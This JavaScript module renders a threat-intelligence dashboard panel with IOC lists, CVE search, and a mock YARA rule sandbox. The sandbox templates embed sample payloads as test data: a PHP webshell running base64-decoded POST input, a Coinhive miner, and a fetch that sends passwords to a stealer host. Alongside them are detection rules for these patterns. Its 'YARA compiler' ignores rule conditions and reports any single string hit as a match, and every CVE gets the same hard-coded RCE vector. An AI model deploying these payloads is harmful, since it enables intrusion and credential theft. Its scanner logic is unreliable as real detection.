/* ─── INTELLIGENCE VIEW ──────────────────────────────────────────────────────
   Threat Intelligence: IOC database (IP / Domain / Hash) + CVE tracker.
   v2.0: Added interactive YARA Rule Sandbox compiler + CVE Search tool.
─────────────────────────────────────────────────────────────────────────── */

function renderIntelligenceView() {
  const main = document.getElementById('main-content');
  if (!main) return;

  // Clear previous instance to prevent double rendering
  const existing = document.getElementById('view-intelligence');
  if (existing) existing.remove();

  main.insertAdjacentHTML('beforeend', `
    <div id="view-intelligence" style="display:none">
      <div class="header">
        <div class="header-left">
          <h1 style="text-shadow: 0 0 15px rgba(168, 85, 247, 0.4)">Threat Intelligence</h1>
          <p>IOC database · YARA signature rules · CVE vulnerability tracking</p>
        </div>
      </div>

      <div style="display:grid; grid-template-columns: 1.1fr 0.9fr; gap:16px; align-items: start;">

        <!-- LEFT COLUMN: IOC & YARA SANDBOX -->
        <div style="display:flex; flex-direction:column; gap:16px;">
          
          <!-- IOC Panel -->
          <div class="panel">
            <div class="panel-header">
              <div class="panel-title">
                <div class="panel-dot" style="background:var(--danger)"></div>
                Indicators of Compromise
              </div>
              <button class="mini-btn" onclick="toast('IOC Addition requested - open whitelist panel')">+ Add IOC</button>
            </div>
            <div class="tabs">
              <button class="tab active" onclick="iocTab('ip',this)">IP Addresses</button>
              <button class="tab"        onclick="iocTab('domain',this)">Domains</button>
              <button class="tab"        onclick="iocTab('hash',this)">File Hashes</button>
            </div>
            <div id="ioc-content" class="scroll-y" style="max-height:260px"></div>
          </div>

          <!-- YARA Sandbox Panel -->
          <div class="panel">
            <div class="panel-header" style="margin-bottom: 8px">
              <div class="panel-title">
                <div class="panel-dot" style="background:var(--purple)"></div>
                YARA Rules Signature Sandbox
              </div>
            </div>
            
            <div class="yara-container">
              <div class="code-editor-header">
                <span>SELECT TEMPLATE:</span>
                <select id="yara-template-select" style="background:#09090b; color:var(--purple); border:1px solid var(--border); font-size:10px; font-family:var(--font-mono); border-radius:4px" onchange="loadYaraTemplate()">
                  <option value="webshell">PHP WebShell Signature</option>
                  <option value="miner">Cryptominer Detector</option>
                  <option value="exfil">Password Exfiltration</option>
                </select>
              </div>

              <textarea id="yara-rule-editor" class="yara-textarea" spellcheck="false"></textarea>

              <div class="code-editor-header">
                <span>TEST PAYLOAD CONTENT:</span>
              </div>
              <textarea id="yara-payload-input" class="yara-sample-textarea" placeholder="Paste test content/script here..." spellcheck="false"></textarea>

              <button class="btn" style="border-color:var(--purple); color:#fff; background:rgba(168, 85, 247, 0.1); width:100%; font-weight:700" onclick="runYaraScan()">
                🔍 Compile & Scan YARA Rule
              </button>

              <div id="yara-results" class="yara-results">
                Console output offline. Press 'Compile & Scan' to execute.
              </div>
            </div>
          </div>

        </div>

        <!-- RIGHT COLUMN: CVE PANEL -->
        <div style="display:flex; flex-direction:column; gap:16px;">
          
          <!-- CVE Panel -->
          <div class="panel">
            <div class="panel-header" style="margin-bottom: 8px">
              <div class="panel-title">
                <div class="panel-dot" style="background:var(--warn)"></div>
                Active CVEs
              </div>
            </div>

            <!-- CVE Search input -->
            <div class="search-bar" style="margin-bottom: 12px">
              <input id="cve-search-input" class="search-input" placeholder="Search CVEs or keywords..." oninput="filterCVEs()">
            </div>

            <div id="cve-list" class="scroll-y" style="max-height:480px"></div>
          </div>

        </div>

      </div>
      
      <!-- CVE DETAILS DRAWER OVERLAY -->
      <div id="cve-detail-overlay" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); width:380px; background:var(--panel2); border:1px solid var(--warn); border-radius:12px; padding:20px; box-shadow:0 10px 40px rgba(0,0,0,0.6); z-index:1000; backdrop-filter:blur(16px)">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px">
          <h3 id="cve-overlay-id" style="color:var(--text); margin:0; font-family:var(--font-mono)">CVE-2024-XXXX</h3>
          <span id="cve-overlay-score" style="background:var(--danger); color:#000; font-size:10px; font-weight:700; padding:2px 8px; border-radius:4px">CVSS 10.0</span>
        </div>
        <div id="cve-overlay-body" style="font-size:12px; color:var(--muted2); line-height:1.5; margin-bottom:16px"></div>
        <button class="btn" style="width:100%; border-color:var(--warn); color:var(--warn)" onclick="closeCveOverlay()">Close Portal</button>
      </div>

    </div>
  `);

  // Load default template on start
  loadYaraTemplate();
}

// ─── IOC ──────────────────────────────────────────────────────────────────────

function renderIOC(type) {
  AppState.curIocTab = type;
  const el = document.getElementById('ioc-content');
  if (!el) return;

  el.innerHTML = (IOC_DATA[type] || []).map(i => {
    const cls = i.risk === 'critical' ? 'dp-c' : i.risk === 'high' ? 'dp-h' : 'dp-m';
    return `
      <div class="domain-row">
        <span class="domain-name" style="font-family:monospace;font-size:11px">${i.val}</span>
        <span style="color:var(--muted);font-size:10px;margin-right:8px">${i.type}</span>
        <span class="domain-pill ${cls}">${i.risk.toUpperCase()}</span>
      </div>`;
  }).join('');
}

function iocTab(type, btn) {
  document.querySelectorAll('.tabs .tab').forEach(t => t.classList.remove('active'));
  btn.classList.add('active');
  renderIOC(type);
}

// ─── CVEs ─────────────────────────────────────────────────────────────────────

function renderCVEs(filterQuery = "") {
  const el = document.getElementById('cve-list');
  if (!el) return;

  const filtered = CVE_DATA.filter(c => {
    if (!filterQuery) return true;
    return c.id.toLowerCase().includes(filterQuery) || 
           c.desc.toLowerCase().includes(filterQuery) || 
           c.affected.toLowerCase().includes(filterQuery);
  });

  if (filtered.length === 0) {
    el.innerHTML = `<div class="empty">No matching CVE records found</div>`;
    return;
  }

  el.innerHTML = filtered.map(c => {
    const col = c.score >= 9 ? 'var(--danger)' : c.score >= 7 ? 'var(--warn)' : 'var(--accent)';
    return `
      <div class="domain-row" style="flex-direction:column;align-items:flex-start;gap:4px; cursor:pointer"
           onclick="showCveOverlay('${c.id}', ${c.score}, '${escapeHtml(c.desc)}', '${escapeHtml(c.affected)}')">
        <div style="display:flex;width:100%;align-items:center;gap:8px">
          <span style="font-size:11px;font-weight:700;color:var(--text)">${c.id}</span>
          <span style="font-size:10px;font-weight:700;color:${col};background:rgba(0,0,0,.3);padding:1px 6px;border-radius:4px">CVSS ${c.score}</span>
          <span style="margin-left:auto;font-size:10px;color:var(--muted)">${c.affected}</span>
        </div>
        <div style="font-size:11px;color:var(--muted2)">${c.desc}</div>
      </div>`;
  }).join('');
}

function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}

window.filterCVEs = function() {
  const query = (document.getElementById("cve-search-input")?.value || "").toLowerCase();
  renderCVEs(query);
};

window.showCveOverlay = function(id, score, desc, affected) {
  const overlay = document.getElementById("cve-detail-overlay");
  const oid = document.getElementById("cve-overlay-id");
  const oscore = document.getElementById("cve-overlay-score");
  const obody = document.getElementById("cve-overlay-body");
  
  if (!overlay || !oid || !oscore || !obody) return;
  
  oid.textContent = id;
  oscore.textContent = `CVSS ${score}`;
  oscore.style.background = score >= 9 ? 'var(--danger)' : score >= 7 ? 'var(--warn)' : 'var(--accent)';
  
  obody.innerHTML = `
    <strong style="color:var(--text)">Vulnerability Description:</strong>
    <p style="margin-top:4px; margin-bottom:12px">${desc}</p>
    <strong style="color:var(--text)">Affected Software:</strong>
    <p style="margin-top:4px; margin-bottom:12px; font-family:var(--font-mono)">${affected}</p>
    <strong style="color:var(--text)">Vulnerability Vector Detail:</strong>
    <p style="margin-top:4px; margin-bottom:4px; font-family:var(--font-mono); font-size:10px; color:var(--cyber-blue)">
      AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (Remote exploit - RCE)
    </p>
    <strong style="color:var(--text)">Recommended Patch / Remediation:</strong>
    <p style="margin-top:4px; margin-bottom:0; color:#34d399">
      Update target services immediately to safe version. Apply firewall egress filtering to restrict exfiltration.
    </p>
  `;
  
  overlay.style.display = "block";
};

window.closeCveOverlay = function() {
  const overlay = document.getElementById("cve-detail-overlay");
  if (overlay) overlay.style.display = "none";
};

// ─── YARA SANDBOX ENGINE ──────────────────────────────────────────────────────

const YARA_TEMPLATES = {
  webshell: {
    rule: `rule PHP_Webshell_Detector {\n  meta:\n    description = "Detects basic PHP webshell code patterns"\n  strings:\n    $eval = "eval"\n    $decode = "base64_decode"\n    $get = "$_GET"\n    $post = "$_POST"\n  condition:\n    $eval and ($decode or $get or $post)\n}`,
    payload: `<?php\n// Test php payload\n$cmd = $_POST['cmd'];\neval(base64_decode($cmd));\n?>`
  },
  miner: {
    rule: `rule Crypto_Miner_Scanner {\n  meta:\n    description = "Detects cryptominers signatures in dynamically injected scripts"\n  strings:\n    $kw1 = "coinhive"\n    $kw2 = "CoinHive.Anonymous"\n    $kw3 = "miner.start"\n  condition:\n    any of them\n}`,
    payload: `<script src="https://coinhive.com/miner.js"></script>\n<script>\n  const miner = new CoinHive.Anonymous("miner_key");\n  miner.start();\n</script>`
  },
  exfil: {
    rule: `rule Credential_Exfiltration_Alert {\n  meta:\n    description = "Scans requests transmitting plain passwords"\n  strings:\n    $cc = /password|passwd|pwd/i\n    $cookie = "document.cookie"\n    $exfil = "stealer-api"\n  condition:\n    $cc and ($cookie or $exfil)\n}`,
    payload: `const body = "user=" + email + "&password=" + pwd;\nfetch("https://stealer-api.ru/collect", {\n  method: "POST",\n  body: body\n});`
  }
};

window.loadYaraTemplate = function() {
  const val = document.getElementById("yara-template-select")?.value;
  const t = YARA_TEMPLATES[val];
  if (!t) return;
  
  const editor = document.getElementById("yara-rule-editor");
  const payload = document.getElementById("yara-payload-input");
  
  if (editor) editor.value = t.rule;
  if (payload) payload.value = t.payload;
};

window.runYaraScan = function() {
  const resultsDiv = document.getElementById("yara-results");
  if (!resultsDiv) return;

  resultsDiv.innerHTML = `<span style="color:var(--purple)">COMPILING YARA ENGINE...</span>`;
  resultsDiv.className = "yara-results";

  setTimeout(() => {
    try {
      const ruleText = document.getElementById("yara-rule-editor")?.value || "";
      const payloadText = document.getElementById("yara-payload-input")?.value || "";

      // 1. Extract strings from rule
      // Match lines starting with $variable = "value" or /regex/
      const stringRegex = /\$([a-zA-Z0-9_]+)\s*=\s*(["/])(.*?)\2/g;
      let match;
      const stringsToMatch = [];

      while ((match = stringRegex.exec(ruleText)) !== null) {
        const varName = match[1];
        const isRegex = match[2] === '/';
        const pattern = match[3];
        stringsToMatch.push({ varName, isRegex, pattern });
      }

      if (stringsToMatch.length === 0) {
        resultsDiv.innerHTML = `<span style="color:var(--danger)">[COMPILE ERROR] No strings variable block found (e.g. $a = "string")</span>`;
        return;
      }

      // 2. Perform scanning
      const matched = [];
      stringsToMatch.forEach(s => {
        let hasMatch = false;
        if (s.isRegex) {
          try {
            const re = new RegExp(s.pattern, 'i');
            hasMatch = re.test(payloadText);
          } catch {}
        } else {
          hasMatch = payloadText.includes(s.pattern);
        }

        if (hasMatch) {
          matched.push(s.varName);
        }
      });

      // 3. Output results
      if (matched.length > 0) {
        resultsDiv.className = "yara-results match";
        resultsDiv.innerHTML = `[SUCCESS] YARA RULE COMPILED AND HIT MATCHES:\n----------------------------------------\nMATCH DETECTED: [${matched.map(m => "$" + m).join(", ")}]\n\nDetails: Target contains signature matches. Security Alert level escalated to CRITICAL.`;
        toast("YARA Match Found!");
      } else {
        resultsDiv.innerHTML = `[SUCCESS] YARA RULE COMPILED:\n----------------------------------------\nSCAN STATUS: CLEAN\n\nNo matches found in the tested sample payload.`;
        toast("YARA Rule Executed: Clean Scan");
      }

    } catch (e) {
      resultsDiv.innerHTML = `<span style="color:var(--danger)">[COMPILER EXCEPTION] ${e.message}</span>`;
    }
  }, 600);
};
